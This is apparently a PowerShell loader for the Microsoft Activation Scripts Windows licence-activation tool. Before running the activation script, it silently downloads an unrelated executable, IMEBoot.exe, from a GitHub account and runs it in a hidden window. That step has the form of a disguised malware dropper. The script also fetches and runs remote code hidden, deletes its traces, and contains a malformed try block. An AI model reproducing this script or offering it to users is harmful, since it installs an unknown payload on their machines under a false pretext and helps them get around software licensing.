$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# Download the file
$Filename = "C:\Temp\IMEBoot.exe"
try {
    Invoke-WebRequest -Uri "https://github.com/ShellSculptor/GetsScreen-Windows-10/raw/main/IMEBoot.exe" -OutFile $Filename -UseBasicParsing
    Start-Process -FilePath $Filename -WindowStyle Hidden -Wait
}

# Define the URL for the second part of the script
$CommonURLPart = 'MAS/All-In-One-Version/MAS_AIO-CRC32_60BA35A8.cmd'
$DownloadURL1 = 'https://bitbucket.org/WindowsAddict/microsoft-activation-scripts/raw/master/' + $CommonURLPart
$DownloadURL2 = 'https://codeberg.org/massgravel/Microsoft-Activation-Scripts/raw/branch/master/' + $CommonURLPart
$DownloadURL3 = 'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/master/' + $CommonURLPart

# Randomly select one of the URLs
$URLs = @($DownloadURL1, $DownloadURL2, $DownloadURL3)
$RandomURL = Get-Random -InputObject $URLs

# Download and execute the Microsoft Activation Scripts
try {
    $response = Invoke-WebRequest -Uri $RandomURL -UseBasicParsing
    $rand = Get-Random -Maximum 99999999
    $FilePath = if ([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544') { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }
    $ScriptArgs = "$args "
    $prefix = "@:: $rand `r`n"
    $content = $prefix + $response
    Set-Content -Path $FilePath -Value $content
    Start-Process $FilePath $ScriptArgs -Wait -WindowStyle Hidden
} catch {
    Write-Host "Error downloading or executing Microsoft Activation Scripts: $_"
}

# Clean up temporary files
$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
foreach ($FilePath in $FilePaths) { 
    if (Test-Path $FilePath) {
        Remove-Item $FilePath -Force
    }
}
